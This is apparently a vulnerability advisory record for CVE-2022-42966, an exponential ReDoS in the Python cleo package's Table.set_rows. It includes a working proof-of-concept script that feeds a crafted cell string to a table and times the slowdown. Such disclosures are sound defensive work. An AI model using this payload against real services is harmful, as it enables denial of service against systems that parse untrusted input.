{"hash":"fffa45db64f7fc9614e50c4ab14983ff59915964","data":{"post":{"title":"cleo ReDoS","path":"/vulnerabilities/cleo-redos-xray-257186/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>Exponential ReDoS in cleo leads to denial of service</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://pypi.org/project/cleo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">cleo</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>cleo (,)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the cleo PyPI package, when an attacker is able to supply arbitrary input to the <code>Table.set_rows</code> method</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-python\">import time\n\nfrom cleo import ui\nfrom cleo.io.buffered_io import BufferedIO\n\nfrom cleo.ui.table import Table\nfrom cleo.ui.table_cell import TableCell\nfrom cleo.ui.table_separator import TableSeparator\nfrom cleo.ui.table_style import TableStyle\nfrom cleo.ui.table_cell_style import TableCellStyle\n\n\n\n\ndef column_style(i):\n    io = BufferedIO()\n    table = Table(io)\n    table.set_headers([\"ISBN\", \"Title\", \"Author\", \"Price\"])\n\n    table.set_rows([\n                [\"99921-58-10-7\", \"Divine Comedy\", \"Dante Alighieri\"],\n                TableSeparator(),\n                [TableCell('&#x3C;0=,' + '000=0'*i + '00=0>', colspan=3,style=TableCellStyle())],\n                TableSeparator(),\n                [TableCell(\"Arduino: A Quick-Start Guide\", colspan=2), \"Mark Schmidt\"],\n                TableSeparator(),\n                [\"9971-5-0210-0\", TableCell(\"A Tale of \\nTwo Cities\", colspan=2)],\n            ])\n\n    style = TableStyle()\n    style.set_pad_type(\"left\")\n    table.set_column_style(3, style)\n    table.set_column_style(2, style)\n\n    table.render()\n\n\nfor i in range(1000):\n    start = time.time()\n    try:\n        column_style(i)\n    except:\n        pass\n    print(f\"{i}: Done in {time.time() - start}\")\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-42966\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">NVD</a></p>\n","description":"CVE-2022-42966 Medium severity. Exponential ReDoS in cleo leads to denial of service","date_published":"2022-10-15","xray_id":"XRAY-257186","vul_id":"CVE-2022-42966","severity":"medium","discovered_by":"Denys Vozniuk","last_updated":"2022-10-15","cvss":5.9}},"context":{}}